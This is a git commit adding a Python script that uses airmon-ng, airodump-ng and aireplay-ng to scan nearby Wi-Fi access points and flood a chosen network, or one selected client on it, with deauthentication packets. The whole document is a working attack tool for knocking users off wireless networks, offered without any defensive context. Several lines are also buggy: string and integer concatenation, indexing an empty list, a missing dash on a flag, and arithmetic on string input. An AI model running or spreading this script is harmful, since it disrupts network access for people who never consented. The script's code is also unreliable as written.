d5afcbe25cd551cc47476404c419102adbde8a2f
root <root@localhost.localdomain>
2018-04-19 15:33:20 -0500

    Added deauth script, global deauth working

---
+++ deauth.py
@@ -0,0 +1,82 @@
+import subprocess
+import csv
+from os import system
+import time 
+
+# bind input to raw_input in Python 2 to ensure compatibility
+try:
+   input = raw_input
+except NameError:
+   pass
+
+
+
+# ----------------------------------------------------------
+# Scan available access points, user selects by name 
+# ----------------------------------------------------------
+
+subprocess.call(['airmon-ng', 'start', 'wlan0'])
+p = subprocess.Popen(['airodump-ng', 'wlan0mon', '-c', '6', '-w', 'deauth_aps', '--output-format', 'csv'])
+time.sleep(10)
+p.terminate()
+
+macAddr = ''
+channel = ''
+name = ' ' + input("Type in Access Point name: ")
+with open('deauth_aps-01.csv') as f:
+    for row in f:
+        line = row.split(',')
+        # If you take in some argument here instead of hardcoded AP name
+        if (name in line):
+            macAddr = line[0]
+            channel = line[3].replace(" ", "")
+        #print(channel)
+
+
+# ----------------------------------------------------------
+# Ask user to specify broadcast or specific deauth
+# Send broadcast deauth to AP, or scan clients connected to AP and send deauth to specified client
+# ----------------------------------------------------------
+
+print("Broadcast or specific client?")
+ans = input("Leave empty for broadcast, input anything to scan clients and specify target: ")
+
+if ans == '':
+    # Send broadcast deauth to AP
+    # Transmits unlimited deauth packets for 10 seconds
+    p = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', macAddr, 'wlan0mon'])
+    time.sleep(10)
+    p.terminate()
+else:
+    # Scan clients on specified access point, user selects target by index
+    # Scan with AP's channel to ensure success of scan and deauth
+    p = subprocess.Popen(['airodump-ng', 'wlan0mon', '--bssid', macAddr, '-c', channel, '-w', 'deauth_clients', '--output-format', 'csv'])
+    time.sleep(10)
+    p.terminate()
+
+    clients = []
+    count = 1
+    with open('deauth_clients-01.csv') as f:
+        for row in f:
+            line = row.split(',')
+            print(count + ".    " + line[0])
+            clients[count-1] = line[0]
+            count += 1
+    choice = input("Input index of desired target: ")
+    client_macAddr = clients[choice-1]
+
+    # Send deauth to target client
+    # Transmits unlimited deauth packets for 10 seconds
+    p = subprocess.Popen(['aireplay-ng', '--deauth', '0', '-a', macAddr, 'c', client_macAddr, 'wlan0mon'])
+    time.sleep(10)
+    p.terminate()
+
+
+# ----------------------------------------------------------
+# Open client scan in new window to observe effect of deauth
+# ----------------------------------------------------------
+
+#p = subprocess.Popen(['airodump-ng', 'wlan0mon', '--bssid', macAddr, '-c', channel], creationflags=CREATE_NEW_CONSOLE)
+#time.sleep(15)
+#p.terminate()
+
